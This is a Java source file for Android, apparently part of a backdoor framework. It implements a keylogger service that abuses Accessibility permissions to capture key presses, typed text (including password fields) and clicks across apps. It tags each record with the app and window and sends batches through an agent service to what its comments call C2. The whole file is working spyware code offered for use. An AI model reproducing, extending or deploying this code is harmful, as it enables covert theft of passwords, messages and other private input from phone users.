package com.lazyframework.backdoor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * KeyloggerService - Real-time keystroke capture via Accessibility Service
 * 
 * Features:
 * - Live keystroke capture
 * - Batch transmission to C2
 * - Keystroke filtering (app names, sensitive apps)
 * - Character/key event logging
 * - Timestamp tracking
 * - Performance optimized
 * 
 * Requirements:
 * - Android 5.0+ (LOLLIPOP)
 * - Accessibility Service permission
 * - User must enable in Accessibility Settings
 */
public class KeyloggerService extends AccessibilityService {
    
    private static final String TAG = "KeyloggerService";
    private static final int BATCH_SIZE = 50; // Send every 50 keystrokes
    private static final long BATCH_TIMEOUT = 30000; // Or every 30 seconds
    
    // Keystroke buffer
    private Queue<KeystrokeEvent> keystrokeQueue;
    private Handler handler;
    private Runnable batchSendRunnable;
    
    // State management
    private AtomicBoolean isLogging = new AtomicBoolean(false);
    private AtomicBoolean isServiceRunning = new AtomicBoolean(false);
    private long lastBatchSentTime = 0;
    private int totalKeystrokesLogged = 0;
    
    // Current context tracking
    private String currentApp = "";
    private String currentWindow = "";
    
    // Filtered apps (sensitive apps to exclude)
    private static final String[] EXCLUDED_APPS = {
        "com.android.systemui",
        "com.android.launcher",
        "com.google.android.gms",
        "android",
    };
    
    // ==================== LIFECYCLE ====================
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "✅ KeyloggerService connected");
        
        // Initialize
        keystrokeQueue = new ConcurrentLinkedQueue<>();
        handler = new Handler(Looper.getMainLooper());
        isLogging.set(true);
        isServiceRunning.set(true);
        
        // Configure accessibility service
        configureAccessibilityService();
        
        // Start batch send scheduler
        startBatchSendScheduler();
        
        Log.d(TAG, "🔐 Keylogger initialized and listening");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "⏹️ KeyloggerService destroyed");
        
        isLogging.set(false);
        isServiceRunning.set(false);
        
        // Send remaining keystrokes
        if (!keystrokeQueue.isEmpty()) {
            Log.d(TAG, "📤 Sending remaining " + keystrokeQueue.size() + " keystrokes");
            sendBatchKeystrokes();
        }
        
        // Stop scheduler
        if (handler != null && batchSendRunnable != null) {
            handler.removeCallbacks(batchSendRunnable);
        }
    }
    
    // ==================== ACCESSIBILITY EVENT HANDLING ====================
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isLogging.get()) {
            return;
        }
        
        try {
            int eventType = event.getEventType();
            
            // Update window/app context
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                currentWindow = event.getSource() != null ? 
                    event.getSource().getClassName().toString() : "Unknown";
                currentApp = event.getPackageName() != null ? 
                    event.getPackageName().toString() : "Unknown";
                
                Log.d(TAG, "📱 Window changed: " + currentApp + 
                    " / " + currentWindow);
            }
            
            // Capture text changes (password fields, input fields, etc)
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleTextChange(event);
            }
            
            // Capture clicked views
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleViewClicked(event);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error handling accessibility event: " + e.getMessage());
        }
    }
    
    @Override
    public boolean onKeyEvent(KeyEvent event) {
        if (!isLogging.get()) {
            return false;
        }
        
        try {
            // Capture physical key presses
            if (event.getAction() == KeyEvent.ACTION_DOWN) {
                handleKeyDown(event);
            }
            
            // Return false to allow event to propagate
            return false;
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling key event: " + e.getMessage());
            return false;
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "⚠️ KeyloggerService interrupted");
    }
    
    // ==================== KEYSTROKE CAPTURE ====================
    
    private void handleKeyDown(KeyEvent event) {
        try {
            int keyCode = event.getKeyCode();
            String keyName = getKeyName(keyCode);
            
            if (keyName == null) {
                return; // Skip unknown keys
            }
            
            // Skip system keys but log some important ones
            if (isSystemKey(keyCode) && !isImportantSystemKey(keyCode)) {
                return;
            }
            
            KeystrokeEvent keystroke = new KeystrokeEvent(
                    keyName,
                    getCurrentTimestamp(),
                    currentApp,
                    currentWindow,
                    event.getRepeatCount() > 0
            );
            
            keystrokeQueue.offer(keystroke);
            totalKeystrokesLogged++;
            
            if (totalKeystrokesLogged % 100 == 0) {
                Log.d(TAG, "📊 Total keystrokes logged: " + totalKeystrokesLogged);
            }
            
            // Check if should send batch
            if (keystrokeQueue.size() >= BATCH_SIZE) {
                Log.d(TAG, "📤 Batch threshold reached (" + BATCH_SIZE + 
                    "), sending immediately");
                sendBatchKeystrokes();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing keystroke: " + e.getMessage());
        }
    }
    
    private void handleTextChange(AccessibilityEvent event) {
        try {
            CharSequence text = null;
            
            if (event.getBeforeText() != null && event.getText() != null) {
                // Calculate what was added
                String before = event.getBeforeText().toString();
                String after = event.getText().isEmpty() ? "" : 
                    event.getText().get(0).toString();
                
                if (after.length() > before.length()) {
                    text = after.subSequence(before.length(), after.length());
                }
            }
            
            if (text != null && text.length() > 0) {
                String textStr = text.toString();
                
                // Log each character as separate keystroke
                for (char c : textStr.toCharArray()) {
                    KeystrokeEvent keystroke = new KeystrokeEvent(
                            String.valueOf(c),
                            getCurrentTimestamp(),
                            currentApp,
                            currentWindow,
                            false
                    );
                    
                    keystrokeQueue.offer(keystroke);
                    totalKeystrokesLogged++;
                }
                
                Log.d(TAG, "📝 Captured text change: " + textStr.length() + 
                    " characters from " + currentApp);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling text change: " + e.getMessage());
        }
    }
    
    private void handleViewClicked(AccessibilityEvent event) {
        try {
            if (event.getSource() != null) {
                CharSequence contentDesc = event.getSource().getContentDescription();
                CharSequence text = event.getSource().getText();
                
                String clickInfo = text != null ? text.toString() : 
                    (contentDesc != null ? contentDesc.toString() : "Button");
                
                KeystrokeEvent keystroke = new KeystrokeEvent(
                        "[CLICK:" + clickInfo + "]",
                        getCurrentTimestamp(),
                        currentApp,
                        currentWindow,
                        false
                );
                
                keystrokeQueue.offer(keystroke);
                totalKeystrokesLogged++;
                
                Log.d(TAG, "🖱️ Captured click: " + clickInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling view click: " + e.getMessage());
        }
    }
    
    // ==================== BATCH SEND ====================
    
    private void startBatchSendScheduler() {
        batchSendRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    long now = System.currentTimeMillis();
                    
                    // Send if timeout reached or queue has items
                    if ((now - lastBatchSentTime >= BATCH_TIMEOUT) && 
                            !keystrokeQueue.isEmpty()) {
                        Log.d(TAG, "⏱️ Batch timeout reached, sending keystrokes");
                        sendBatchKeystrokes();
                    }
                    
                    // Reschedule
                    handler.postDelayed(this, 5000); // Check every 5 seconds
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in batch scheduler: " + e.getMessage());
                    handler.postDelayed(this, 5000);
                }
            }
        };
        
        handler.postDelayed(batchSendRunnable, BATCH_TIMEOUT);
    }
    
    private void sendBatchKeystrokes() {
        try {
            if (keystrokeQueue.isEmpty()) {
                return;
            }
            
            // Extract batch
            JSONArray keystrokes = new JSONArray();
            int count = 0;
            
            while (!keystrokeQueue.isEmpty() && count < BATCH_SIZE) {
                KeystrokeEvent event = keystrokeQueue.poll();
                if (event != null) {
                    keystrokes.put(event.toJSON());
                    count++;
                }
            }
            
            if (count == 0) {
                return;
            }
            
            // Build message
            JSONObject json = new JSONObject();
            json.put("type", "response");
            json.put("agent_id", getAgentId());
            json.put("command", "KEYLOG_BATCH");
            json.put("timestamp", System.currentTimeMillis());
            
            JSONObject result = new JSONObject();
            result.put("type", "keylog_batch");
            result.put("count", count);
            result.put("keystrokes", keystrokes);
            result.put("batch_timestamp", getCurrentTimestamp());
            
            json.put("result", result);
            
            // Send to agent service
            AgentService agentService = ServiceController.getAgentService();
            if (agentService != null) {
                agentService.sendScreenFrame(json.toString());
                lastBatchSentTime = System.currentTimeMillis();
                
                Log.d(TAG, "📤 Sent batch: " + count + " keystrokes");
            } else {
                Log.w(TAG, "⚠️ AgentService unavailable, queueing batch");
                // Re-queue for later
                for (int i = 0; i < keystrokes.length(); i++) {
                    keystrokeQueue.offer(KeystrokeEvent.fromJSON(
                        keystrokes.getJSONObject(i)));
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending batch: " + e.getMessage());
        }
    }
    
    // ==================== CONFIGURATION ====================
    
    private void configureAccessibilityService() {
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.DEFAULT |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
            info.notificationTimeout = 100;
            
            setServiceInfo(info);
            
            Log.d(TAG, "✅ Accessibility service configured");
            
        } catch (Exception e) {
            Log.e(TAG, "Error configuring service: " + e.getMessage());
        }
    }
    
    // ==================== UTILITY METHODS ====================
    
    private String getKeyName(int keyCode) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_0: return "0";
            case KeyEvent.KEYCODE_1: return "1";
            case KeyEvent.KEYCODE_2: return "2";
            case KeyEvent.KEYCODE_3: return "3";
            case KeyEvent.KEYCODE_4: return "4";
            case KeyEvent.KEYCODE_5: return "5";
            case KeyEvent.KEYCODE_6: return "6";
            case KeyEvent.KEYCODE_7: return "7";
            case KeyEvent.KEYCODE_8: return "8";
            case KeyEvent.KEYCODE_9: return "9";
            case KeyEvent.KEYCODE_A: return "A";
            case KeyEvent.KEYCODE_B: return "B";
            case KeyEvent.KEYCODE_C: return "C";
            case KeyEvent.KEYCODE_D: return "D";
            case KeyEvent.KEYCODE_E: return "E";
            case KeyEvent.KEYCODE_F: return "F";
            case KeyEvent.KEYCODE_G: return "G";
            case KeyEvent.KEYCODE_H: return "H";
            case KeyEvent.KEYCODE_I: return "I";
            case KeyEvent.KEYCODE_J: return "J";
            case KeyEvent.KEYCODE_K: return "K";
            case KeyEvent.KEYCODE_L: return "L";
            case KeyEvent.KEYCODE_M: return "M";
            case KeyEvent.KEYCODE_N: return "N";
            case KeyEvent.KEYCODE_O: return "O";
            case KeyEvent.KEYCODE_P: return "P";
            case KeyEvent.KEYCODE_Q: return "Q";
            case KeyEvent.KEYCODE_R: return "R";
            case KeyEvent.KEYCODE_S: return "S";
            case KeyEvent.KEYCODE_T: return "T";
            case KeyEvent.KEYCODE_U: return "U";
            case KeyEvent.KEYCODE_V: return "V";
            case KeyEvent.KEYCODE_W: return "W";
            case KeyEvent.KEYCODE_X: return "X";
            case KeyEvent.KEYCODE_Y: return "Y";
            case KeyEvent.KEYCODE_Z: return "Z";
            case KeyEvent.KEYCODE_SPACE: return " ";
            case KeyEvent.KEYCODE_ENTER: return "[ENTER]";
            case KeyEvent.KEYCODE_DEL: return "[BACKSPACE]";
            case KeyEvent.KEYCODE_TAB: return "[TAB]";
            case KeyEvent.KEYCODE_PERIOD: return ".";
            case KeyEvent.KEYCODE_COMMA: return ",";
            case KeyEvent.KEYCODE_AT: return "@";
            case KeyEvent.KEYCODE_APOSTROPHE: return "'";
            case KeyEvent.KEYCODE_SLASH: return "/";
            case KeyEvent.KEYCODE_STAR: return "*";
            case KeyEvent.KEYCODE_MINUS: return "-";
            case KeyEvent.KEYCODE_PLUS: return "+";
            case KeyEvent.KEYCODE_EQUALS: return "=";
            case KeyEvent.KEYCODE_SEMICOLON: return ";";
            case KeyEvent.KEYCODE_GRAVE: return "`";
            case KeyEvent.KEYCODE_LEFT_BRACKET: return "[";
            case KeyEvent.KEYCODE_RIGHT_BRACKET: return "]";
            case KeyEvent.KEYCODE_BACKSLASH: return "\\";
            case KeyEvent.KEYCODE_VOLUME_UP: return "[VOL_UP]";
            case KeyEvent.KEYCODE_VOLUME_DOWN: return "[VOL_DOWN]";
            case KeyEvent.KEYCODE_POWER: return "[POWER]";
            default: return null;
        }
    }
    
    private boolean isSystemKey(int keyCode) {
        return keyCode >= KeyEvent.KEYCODE_SOFT_LEFT && 
               keyCode <= KeyEvent.KEYCODE_BUTTON_MODE;
    }
    
    private boolean isImportantSystemKey(int keyCode) {
        return keyCode == KeyEvent.KEYCODE_HOME ||
               keyCode == KeyEvent.KEYCODE_BACK ||
               keyCode == KeyEvent.KEYCODE_POWER;
    }
    
    private String getCurrentTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US);
        return sdf.format(new Date());
    }
    
    private String getAgentId() {
        return android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
        );
    }
    
    // ==================== CONTROL METHODS ====================
    
    public void startLogging() {
        isLogging.set(true);
        Log.d(TAG, "▶️ Keylogging started");
    }
    
    public void stopLogging() {
        isLogging.set(false);
        Log.d(TAG, "⏸️ Keylogging paused");
    }
    
    public boolean isLogging() {
        return isLogging.get();
    }
    
    public int getTotalKeystrokesLogged() {
        return totalKeystrokesLogged;
    }
    
    public int getQueueSize() {
        return keystrokeQueue.size();
    }
    
    // ==================== INNER CLASS: KEYSTROKE EVENT ====================
    
    public static class KeystrokeEvent {
        public String key;
        public String timestamp;
        public String app;
        public String window;
        public boolean isRepeat;
        
        public KeystrokeEvent(String key, String timestamp, 
                            String app, String window, boolean isRepeat) {
            this.key = key;
            this.timestamp = timestamp;
            this.app = app;
            this.window = window;
            this.isRepeat = isRepeat;
        }
        
        public JSONObject toJSON() throws Exception {
            JSONObject json = new JSONObject();
            json.put("key", key);
            json.put("timestamp", timestamp);
            json.put("app", app);
            json.put("window", window);
            json.put("is_repeat", isRepeat);
            return json;
        }
        
        public static KeystrokeEvent fromJSON(JSONObject json) throws Exception {
            return new KeystrokeEvent(
                    json.getString("key"),
                    json.getString("timestamp"),
                    json.getString("app"),
                    json.getString("window"),
                    json.getBoolean("is_repeat")
            );
        }
    }
}
